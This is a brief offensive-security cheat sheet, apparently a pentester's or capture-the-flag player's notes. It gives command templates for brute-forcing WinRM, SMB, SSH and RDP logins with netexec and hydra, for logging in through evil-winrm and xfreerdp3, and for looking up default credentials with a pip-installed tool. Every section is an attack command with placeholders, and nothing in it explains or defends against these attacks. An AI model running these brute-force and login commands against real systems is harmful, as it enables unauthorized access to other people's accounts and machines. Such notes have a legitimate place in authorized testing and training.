
## WinRM Exploitation

### Bruteforce Attack WinRM

```bash
netexec winrm <TARGET IP> -u <username/user wordlist> -p <password/password wordlist>
```

### Login WinRM

```bash
evil-winrm -i <TARGET IP> -u <username>
```

## SMB Exploitation
## Bruteforce Attack SMB

```bash
hydra -L <user/user wordlist> -P <password/password wordlist> smb://TARGET IP
```


## SSH Exploitation

### Bruteforce Attack SSH

```bash
hydra -L <username/user wordlist> -P <password/password wordlist> ssh://<TARGET IP>
```


## RDP Exploitation

### Bruteforce Attack RDP

```bash
hydra -L <username/user wordlist> -P <password/password wordlist> rdp://<TARGET IP>
```

### Logging into RDP

```bash
xfreerdp3 /v:<TARGET IP> /u:<username> /p:"<password>"
```


## Default Credentials

### Install

```bash
python -m venv venv
source venv/bin/activate
pip3 install defaultcreds-cheat-sheet
```

### Search Credentials

```bash
creds search <service name>
```

**Example** : `creds search mysql`


